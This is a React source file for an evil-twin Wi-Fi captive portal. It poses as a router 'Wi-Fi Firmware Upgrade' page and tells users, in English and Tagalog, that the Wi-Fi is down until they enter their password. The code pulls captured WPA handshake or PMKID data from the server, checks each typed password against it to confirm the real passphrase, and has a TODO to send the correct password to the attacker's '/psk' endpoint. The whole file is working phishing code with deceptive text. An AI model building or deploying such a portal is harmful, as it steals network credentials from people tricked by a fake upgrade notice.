import { useRef, useState } from "react";
import "./App.css";

import { calculateMIC, calculatePMKID } from "./PmkidMic";
import { EapolMic, EapolPmkid } from "./Model";
import termsAndCondition from "./AssetStrings";

function getMicFromDatabase(): EapolMic {
  const eapolMic: EapolMic = {
    ssid: localStorage.getItem("ssid")!,
    bssid: localStorage.getItem("bssid")!,
    staMac: localStorage.getItem("staMac")!,
    mic: localStorage.getItem("mic")!,
    anonce: localStorage.getItem("anonce")!,
    m2Data: localStorage.getItem("m2Data")!,
    snonce: localStorage.getItem("snonce")!,
  };
  return eapolMic;
}

function getPmkidFromDatabase(): EapolPmkid {
  const eapolPmkid: EapolPmkid = {
    ssid: localStorage.getItem("ssid")!,
    bssid: localStorage.getItem("bssid")!,
    staMac: localStorage.getItem("staMac")!,
    pmkid: localStorage.getItem("pmkid")!,
  };
  return eapolPmkid;
}

function setEapolInLocalStorage(keyType: string, eapol: EapolMic | EapolPmkid) {
  localStorage.setItem("ssid", eapol.ssid);
  localStorage.setItem("bssid", eapol.bssid);
  localStorage.setItem("staMac", eapol.staMac);
  if (keyType === "PMKID") {
    const eapolPmkid = eapol as EapolPmkid;
    localStorage.setItem("pmkid", eapolPmkid.pmkid);
  } else if (keyType === "MIC") {
    const eapolMic = eapol as EapolMic;
    localStorage.setItem("mic", eapolMic.mic);
    localStorage.setItem("anonce", eapolMic.anonce);
    localStorage.setItem("m2Data", eapolMic.m2Data);
    localStorage.setItem("snonce", eapolMic.snonce);
  }
}

function correctPassword(
  setResultText: React.Dispatch<React.SetStateAction<boolean>>
) {
  // TODO: Fetch "/psk" from the server to send a post request containing the Wi-Fi password
  setResultText(true);
  localStorage.clear();
}

function validatePassword(
  checkboxIsChecked: boolean,
  passwdInput: string,
  confirmPasswdInput: string,
  termsAndCondError: React.RefObject<HTMLParagraphElement>,
  passwdError: React.RefObject<HTMLParagraphElement>,
  setPasswdErrorText: React.Dispatch<React.SetStateAction<string>>,
  setResultText: React.Dispatch<React.SetStateAction<boolean>>
) {
  function calcPmkid() {
    calculatePMKID(getPmkidFromDatabase(), passwdInput).then(
      (isCorrectPassword) => {
        if (isCorrectPassword) {
          correctPassword(setResultText);
          passwdError.current?.setAttribute("class", "invisibleErrorText");
        } else {
          passwdError.current?.setAttribute("class", "errorText");
          setPasswdErrorText("*Password is incorrect");
        }
      }
    );
  }

  function calcMic() {
    calculateMIC(getMicFromDatabase(), passwdInput).then(
      (isCorrectPassword) => {
        if (isCorrectPassword) {
          correctPassword(setResultText);
          passwdError.current?.setAttribute("class", "invisibleErrorText");
        } else {
          passwdError.current?.setAttribute("class", "errorText");
          setPasswdErrorText("*Password is incorrect");
        }
      }
    );
  }

  if (!checkboxIsChecked) {
    termsAndCondError.current?.setAttribute("class", "errorText");
    return;
  }
  termsAndCondError.current?.setAttribute("class", "invisibleErrorText");
  if (passwdInput.length === 0 || confirmPasswdInput.length === 0) {
    passwdError.current?.setAttribute("class", "errorText");
    setPasswdErrorText("*PASSWORD CANNOT BE EMPTY");
    return;
  }
  passwdError.current?.setAttribute("class", "invisibleErrorText");
  if (passwdInput !== confirmPasswdInput) {
    passwdError.current?.setAttribute("class", "errorText");
    setPasswdErrorText("*PASSWORD DOES NOT MATCH");
    return;
  }
  passwdError.current?.setAttribute("class", "invisibleErrorText");

  if (localStorage.length === 7) {
    calcMic();
  } else if (localStorage.length === 4) {
    calcPmkid();
  } else {
    fetch("/get-eapol")
      .then((response: Response) => response.text())
      .then((data: string) => {
        const str = data.substring(0, data.length - 1);
        const eapol = JSON.parse(str);
        const numOfPairs = Object.keys(eapol).length;
        if (numOfPairs === 4) {
          setEapolInLocalStorage("PMKID", eapol);
          calcPmkid();
        } else if (numOfPairs === 7) {
          setEapolInLocalStorage("MIC", eapol);
          calcMic();
        }
      });
  }
}

function App() {
  const [getCheckBoxState, setCheckBoxState] = useState<boolean>(false);
  const [getPasswdInputState, setPasswdInputState] = useState<string>("");
  const [getConfirmPasswdInputState, setConfirmPasswdInputState] =
    useState<string>("");
  const [getPasswdErrorText, setPasswdErrorText] = useState<string>("");
  const [getResultText, setResultText] = useState<boolean>(false);

  const termsAndCondErrorTextRef = useRef<HTMLParagraphElement>(null);
  const passwordErrorTextRef = useRef<HTMLParagraphElement>(null);

  return (
    <>
      <nav className="topNav">
        <a href="status">Status</a>
        <a href="network">Network</a>
        <a href="security">Security</a>
        <a href="admin">Admin</a>
      </nav>
      <h1>Wi-Fi Firmware Upgrade</h1>
      <div className="mainDiv">
        <h3>
          Wi-Fi is temporarily down due to new firmware upgrade. Please review
          our new terms and conditions and proceed. Enter your Wi-Fi password
          then click the "Upgrade Firmware" button.
        </h3>
        <h3>
          Ang Wi-Fi ay pansamantalang hindi magamit dahil sa bagong firmware
          upgrade. Mangyaring suriin ang aming bagong mga tuntunin at kundisyon
          at magpatuloy. Ilagay ang iyong Wi-Fi password at i-click ang "Upgrade
          Firmware" button.
        </h3>
        <h4>Terms And Condition:</h4>
        <textarea defaultValue={termsAndCondition} />
        <label style={{ width: "85vw", marginTop: "1rem", color: "#333" }}>
          <input
            onChange={(e) => setCheckBoxState(e.currentTarget.checked)}
            type="checkbox"
            style={{ marginRight: ".5rem" }}
          />
          I Agree With Above Terms And Conditions
        </label>
        <p ref={termsAndCondErrorTextRef} className="invisibleErrorText">
          *PLEASE AGREE TO THE TERMS AND CONDITION BY CLICKING THE BOX
        </p>
        <h4>Password:</h4>
        <input
          onChange={(e) => setPasswdInputState(e.currentTarget.value)}
          type="password"
          className="passwordInput"
        />
        <h4>Confirm Password:</h4>
        <input
          onChange={(e) => setConfirmPasswdInputState(e.currentTarget.value)}
          type="password"
          className="passwordInput"
        />
        <p ref={passwordErrorTextRef} className="invisibleErrorText">
          {getPasswdErrorText}
        </p>
        <div style={{ width: "85vw" }}>
          <button
            onClick={() => {
              // If getResultText is true then password is correct
              if (!getResultText) {
                validatePassword(
                  getCheckBoxState,
                  getPasswdInputState,
                  getConfirmPasswdInputState,
                  termsAndCondErrorTextRef,
                  passwordErrorTextRef,
                  setPasswdErrorText,
                  setResultText
                );
              }
            }}
          >
            Upgrade Firmware
          </button>
          {getResultText ? (
            <p className="resultText">
              UPGRADING FIRMWARE, YOU CAN NOW CLOSE THIS WINDOW
            </p>
          ) : (
            <></>
          )}
        </div>
      </div>
    </>
  );
}

export default App;
